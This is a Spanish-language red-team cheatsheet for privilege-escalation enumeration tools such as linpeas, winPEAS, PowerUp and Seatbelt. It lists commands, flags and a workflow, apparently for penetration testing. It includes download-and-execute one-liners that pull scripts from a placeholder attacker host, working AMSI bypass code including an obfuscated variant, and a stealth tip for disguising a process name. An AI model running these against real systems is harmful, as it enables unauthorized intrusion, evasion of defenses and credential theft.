---
aliases:
  - LinPEAS
  - WinPEAS
  - PEAS
  - PrivEsc Enum
  - Privilege Escalation Enumeration
tags:
  - type/tool
  - tool/linpeas
  - tool/winpeas
  - tool/pspy
  - tool/powerup
  - tool/seatbelt
  - technique/privilege-escalation
  - technique/enumeration
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Exploitation]]"
tertiary categories:
  - "[[Privilege Escalation]]"
type: Tool
linked:
  - "[[Linux Privilege Escalation]]"
  - "[[Windows Privilege Escalation]]"
  - "[[PowerView]]"
  - "[[evil-winrm]]"
  - "[[Metasploit Framework]]"
---
# PrivEsc Enumeration Tools

***

## Cheatsheet

| Tool | Env | Comando |
| --- | --- | --- |
| **linpeas** | Linux | `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \| sh` |
| **winpeas.exe** | Windows | `.\winPEASx64.exe quiet cmd fast` |
| **winpeas.ps1** | Windows (AMSI-safe) | `iex (new-object net.webclient).downloadstring('http://a/winPEAS.ps1')` |
| **pspy64** | Linux | `./pspy64 -pf -i 1000` |
| **PowerUp** | Windows PS | `. .\PowerUp.ps1; Invoke-AllChecks` |
| **Seatbelt** | Windows | `.\Seatbelt.exe -group=all -full` |
| **Watson / Sherlock** | Windows | `.\Watson.exe` (KB → CVE match) |
| **linux-exploit-suggester** | Linux | `./les.sh` |
| **wes.py** | Windows | `wes.py systeminfo.txt --impacts 'Elevation of Privilege'` |
| **accesschk** | Windows | `accesschk.exe /accepteula -uwcqv "Authenticated Users" *` |

***

## Concepto

Tools que automatizan enum para **privilege escalation**. Correr primero, leer output, **luego** ejecutar exploits/misconfigs específicos.

**Regla**: `linpeas` / `winpeas` cubren 80% de vectores; `pspy` / `Seatbelt` complementan (procesos no visibles al user, secrets en registry/memoria).

***

## LINUX

### 1. linpeas.sh

```bash
# Remote (sin tocar disco)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Descargar + ejecutar
wget -q http://atk/linpeas.sh -O /tmp/linpeas.sh && bash /tmp/linpeas.sh

# Guardar output a file
bash linpeas.sh -a > lp.out

# Solo secciones específicas
bash linpeas.sh -o ProcCronSrvcsTimersSocks   # procesos + cron + services + sockets
bash linpeas.sh -o SoftwareInformation        # software installed
bash linpeas.sh -o UserInformation            # users
```

Flags clave:

| Flag | Uso |
| --- | --- |
| `-a` | All checks (incluye slow). |
| `-q` | Quiet (no banner). |
| `-o section` | Solo secciones (csv). |
| `-s` | Superquick — ports+interesting files. |
| `-e` | Extra enum (bus speed, VMs, containers). |
| `-P password` | Password user (sudo -l checks). |
| `-d cidr` | Network discovery en rango. |

**Leer output**: buscar líneas en **rojo con fondo amarillo** → 99% probable vector. Rojo solo → posible. Amarillo → info.

### 2. pspy (process monitoring sin root)

```bash
# Binary static — no deps
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64

# Básico — eventos fs + procesos
./pspy64

# Intervalo + fs events
./pspy64 -pf -i 1000

# Solo procesos nuevos (no forks)
./pspy64 -p

# Inotify fs events
./pspy64 -f
```

Útil para:
- Detectar cron jobs ocultos que corren como root.
- Ver args de procesos (passwords en CLI).
- Watch file events (`$PATH` writes, config changes).

### 3. linux-exploit-suggester

```bash
# LES v2 (perl)
./linux-exploit-suggester-2.pl

# LES.sh (bash, más reciente)
./les.sh --kernel $(uname -r)

# linux-exploit-suggester.sh (mzet)
./linux-exploit-suggester.sh -k 5.15
```

Matchea kernel version contra DB de CVEs con PoC público.

### 4. LinEnum / lse.sh

```bash
# LinEnum — más ligero, report-style
./LinEnum.sh -t -k password -r report -e /tmp/
# -t thorough, -k keyword, -r report file, -e export dir

# lse.sh — 3 niveles verbosidad
./lse.sh -l 1    # 1=interesting, 2=verbose, 3=all
```

### 5. Otros

```bash
# Enumeration script de HackTricks (más liviano)
curl -s https://raw.githubusercontent.com/HackTricks/scripts/master/linux_enum.sh | bash

# unix-privesc-check (pentestmonkey, classic)
./unix-privesc-check standard > upc.out
```

***

## WINDOWS

### 1. winPEAS

```powershell
# Ejecutable (x64)
.\winPEASx64.exe quiet cmd fast

# Con output file
.\winPEASx64.exe quiet cmd fast > peas.txt

# Solo módulos específicos
.\winPEASx64.exe systeminfo
.\winPEASx64.exe userinfo
.\winPEASx64.exe processinfo
.\winPEASx64.exe servicesinfo
.\winPEASx64.exe applicationsinfo
.\winPEASx64.exe networkinfo
.\winPEASx64.exe windowscreds
.\winPEASx64.exe browserinfo
```

Flags:

| Flag | Uso |
| --- | --- |
| `quiet` | Sin banner. |
| `cmd` | Modo CMD (no colors en redirect). |
| `fast` | Skip slow checks. |
| `notcolor` | Sin ANSI. |
| `log[=file]` | Output a file. |
| `-domain` | Incluir AD enum. |
| `-lolbas` | Search LOLBAS. |

**Batch version** (`winPEAS.bat`) — menos exhaustivo pero corre en CMD puro sin .NET.

**PS1 version** (`winPEAS.ps1`) — útil donde binarios bloqueados:
```powershell
iex (new-object net.webclient).downloadstring('http://atk/winPEAS.ps1')
# AMSI bypass antes si Defender activo
```

### 2. PowerUp (PowerSploit)

```powershell
# Cargar
. .\PowerUp.ps1

# Todo de una
Invoke-AllChecks

# Checks individuales
Get-ServiceUnquoted              # unquoted service paths
Get-ModifiableService            # services con ACL writable
Get-ModifiableServiceFile        # service binary ACL
Get-ModifiablePath -Path $env:Path | select -Unique    # PATH hijack
Get-UnattendedInstallFile        # unattend.xml con creds
Get-WebConfig                    # web.config con creds
Get-ApplicationHost              # appcmd.exe creds IIS
Get-SiteListPassword             # McAfee SiteList.xml
Get-CachedGPPPassword            # GPP cpassword en SYSVOL cache
Get-RegistryAutoLogon            # autologon creds en registry
Get-ModifiableRegistryAutoRun    # HKLM Run keys escribibles
Get-UnquotedService              # duplicado — legacy
```

Output incluye `AbuseFunction` sugerida — ejecutable directo (`Invoke-ServiceAbuse`, `Write-ServiceBinary`, etc).

### 3. Seatbelt (GhostPack)

```powershell
# Todos los checks
.\Seatbelt.exe -group=all -full

# Categorías
.\Seatbelt.exe -group=user
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=slack
.\Seatbelt.exe -group=chromium
.\Seatbelt.exe -group=remote

# Checks específicos
.\Seatbelt.exe AuditPolicies PowerShellHistory Processes TokenPrivileges WindowsVault
```

Groups relevantes:
- **user** — Chrome/Edge/Firefox, putty, RDP, history PowerShell, OneDrive, Vault.
- **system** — Audit policies, LAPS, PS logs, Sysmon, WSUS, wireless profiles, printers.
- **slack** — Slack tokens/downloads.
- **remote** — Para target remoto (con `-computername`).

Output JSON: `.\Seatbelt.exe -outputfile="out.json" -outputformat=json -group=all`.

### 4. Watson / Sherlock (exploit suggester)

```powershell
# Watson (nueva, .NET 4.0+)
.\Watson.exe

# Sherlock (legacy, PS)
. .\Sherlock.ps1
Find-AllVulns
```

Matchea KBs instalados contra DB de CVEs con exploit público. Sirve para identificar parches faltantes.

### 5. wes.py (Windows Exploit Suggester NG)

Offline, corre en atacante:

```bash
# Desde target:
systeminfo > systeminfo.txt     # exfil

# En atacante:
pip install wesng
wes.py systeminfo.txt --impacts 'Elevation of Privilege' --severity critical
```

### 6. accesschk (Sysinternals)

```cmd
# Permisos sobre services
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *

# Paths escribibles
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Binary paths específicos
accesschk.exe /accepteula -quvw wuauserv
```

### 7. PowerView (AD misconfig → local privesc)

Ver [[PowerView]] — cubre enum de ACL, GPO, kerberoastable cuentas para local → domain chain.

***

## AMSI bypass rápido (Windows)

winPEAS.ps1, PowerUp.ps1, Seatbelt.ps1 → todos detectados por AMSI/Defender. Bypass runtime:

```powershell
# Matt Graeber classic (aún funciona en entornos sin EDR moderno)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alt (1-liner obfuscado)
$A='S'+'ystem.Management.Automation.A';$B='msiUtils';$C=[Ref].Assembly.GetType("$A$B");$D=$C.GetField('amsiInitFailed','NonPublic,Static');$D.SetValue($null,$true)

# Entonces:
iex (new-object net.webclient).downloadstring('http://atk/winPEAS.ps1')
```

Si AMSI patch falla → usar versión `.exe` cargada via reflección (`evil-winrm` `Invoke-Binary`) o via AppLocker bypass (`InstallUtil`).

***

## Workflow recomendado

### Linux
```bash
# 1. Triage manual (1 min)
id; sudo -l; uname -a; cat /etc/os-release; ls -la /home /root 2>/dev/null

# 2. linpeas full
curl -L https://...linpeas.sh | sh -s -- -a > lp.out

# 3. pspy background — dejar corriendo en tmux mientras se analiza lp.out
./pspy64 -pf &

# 4. Exploit específico
# (match vs GTFOBins, lookup sudo version, etc)
```

### Windows
```powershell
# 1. Triage manual
whoami /all; systeminfo; net localgroup administrators; net user $env:USERNAME /domain

# 2. winPEAS full
.\winPEASx64.exe quiet cmd fast log=peas.txt

# 3. PowerUp para vectores service/registry
. .\PowerUp.ps1; Invoke-AllChecks | Tee-Object pu.out

# 4. Seatbelt para creds en disco/browser
.\Seatbelt.exe -group=user -full > sb.out

# 5. Exploit específico (Watson → KBs faltantes)
.\Watson.exe
```

***

## Opsec

- **linpeas / winpeas** son ruidosos — escanean miles de archivos. En boxes con FIM / EDR → usar módulos individuales (`linpeas -o UserInformation`, `winpeas processinfo`).
- **pspy** no requiere root pero aparece en `ps`. Para stealth → renombrar proceso: `exec -a "[kworker/0:0]" ./pspy64`.
- **Seatbelt** más silencioso que winPEAS — prefiere si hay EDR.
- Evitar ejecutar PS scripts sin bypass AMSI cuando Defender activo.
- Guardar outputs locally, analizar offline — evita releer files N veces.

## Recursos

- [PEASS-ng (linpeas/winpeas)](https://github.com/peass-ng/PEASS-ng)
- [pspy](https://github.com/DominicBreuker/pspy)
- [PowerSploit - PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [GhostPack - Seatbelt](https://github.com/GhostPack/Seatbelt)
- [GhostPack - Watson](https://github.com/rasta-mouse/Watson)
- [wesng](https://github.com/bitsadmin/wesng)
- [HackTricks Checklist - Linux](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
- [HackTricks Checklist - Windows](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)

***
